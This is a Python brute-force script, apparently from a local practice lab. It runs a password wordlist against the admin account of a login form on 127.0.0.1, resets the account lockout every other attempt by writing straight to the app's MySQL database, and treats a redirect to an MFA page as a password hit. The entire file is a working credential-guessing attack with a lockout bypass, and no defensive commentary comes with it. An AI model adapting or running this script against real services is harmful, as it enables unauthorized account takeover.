import requests

url = "http://127.0.0.1:5000/"
username = "admin"

wordlist = ["123456", "admin", "password", "admin123", "letmein", "AudoWrld@59"]


def reset_lock():
    import mysql.connector

    db = mysql.connector.connect(
        host="localhost",
        user="injectionuser",
        password="injectionpass",
        database="mysql_injection",
    )
    cursor = db.cursor()
    cursor.execute(
        "UPDATE user SET failed_attempts = 0, is_locked = 0 WHERE username = %s",
        (username,),
    )
    db.commit()
    db.close()


session = requests.Session()
found = False
failed = []

print("=" * 40)
print("        BRUTE FORCE ATTACK")
print("=" * 40)

for i, pwd in enumerate(wordlist):
    if i % 2 == 0:
        reset_lock()

    response = session.post(
        url, data={"username": username, "password": pwd}, allow_redirects=True
    )

    if "locked" in response.text.lower():
        print(f"[!] Account locked on attempt {i+1}, resetting...")
        reset_lock()
        response = session.post(
            url, data={"username": username, "password": pwd}, allow_redirects=True
        )

    if "/mfa" in response.url or "mfa" in response.text.lower():
        print(f"[+] Password FOUND: {pwd}")
        found = True
        break
    else:
        print(f"[-] Failed: {pwd}")
        failed.append(pwd)

print("=" * 40)
print("        SUMMARY")
print("=" * 40)
print(f"  Target   : {username}")
print(f"  Attempts : {len(failed) + (1 if found else 0)}")
if found:
    print(f"  Password : {pwd}")
else:
    print("  Password not found in wordlist")
    print(f"  Failed   : {', '.join(failed)}")
print("=" * 40)
